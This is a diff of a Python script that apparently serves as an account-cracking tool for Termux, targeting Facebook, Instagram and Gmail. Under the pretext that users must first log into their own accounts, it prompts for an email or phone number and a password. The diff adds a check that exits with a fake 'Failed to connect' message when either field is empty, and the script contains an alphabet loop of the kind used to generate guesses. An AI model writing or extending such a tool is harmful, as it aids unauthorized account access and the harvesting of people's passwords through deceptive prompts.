@@ -19,6 +19,10 @@ def upd():
     os.chdir('/data/data/com.termux/files/home/crack')
     os.system('python cracktool.py')
     sys.exit()
+def nth():
+    if usn == '' or usp == '':
+        time.sleep(2)
+        sys.exit('\nFailed to connect')
 
 def loop():
     az = 'azertyuiopqsdfghjklmwxcvnb'
@@ -45,19 +49,21 @@ if option == 1:
     usn = input('\nenter your email/phonenumber: ')
     usp = input('enter your password: ')
     print('En cours de connexion, veuillez patienter...')
+    nth()
 elif option == 2:
     cho = 'instagram'
     print('\nVeuillez tout d\'abord vous connecter à votre propre compte instagram -/- First log into your own instagram account')
     usn = input('\nenter your email/phonenumber: ')
     usp = input('enter your password: ')
     print('En cours de connexion, veuillez patienter...')
+    nth()
 elif option == 3:
     cho = 'Gmail'
     print('\nVeuillez tout d\'abord vous connecter à votre compte gmail principal -/- First log into your principal gmail account')
     usn = input('\nenter your email: ')
     usp = input('enter your password: ')
     print('En cours de connexion, veuillez patienter...')
-
+    nth()
 
 def connect(nom):
     with open(nom, 'rb') as fp:
